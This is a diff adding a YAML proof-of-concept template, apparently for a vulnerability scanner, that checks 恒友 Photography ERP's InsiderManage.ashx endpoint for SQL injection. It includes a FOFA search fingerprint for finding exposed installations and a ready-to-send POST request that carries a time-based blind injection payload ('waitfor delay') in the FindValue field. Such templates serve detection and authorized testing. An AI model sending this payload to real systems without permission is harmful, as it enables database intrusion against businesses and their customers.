@@ -1,0 +1,31 @@
+id: poc-yaml-hengyousoft-erp-insidermanage-ashx-sqli
+info:
+  name: 恒友摄影ERP InsiderManage.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 恒友摄影ERP
+  fofa: body="BookChooseDateOrder.html"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /ashx/InsiderManage.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=Find&ShopID=&FindType=ChildName&FindValue=1%27;waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"InsiderList\":") &&
+
+    contains(body,"\"ChildName\":") &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
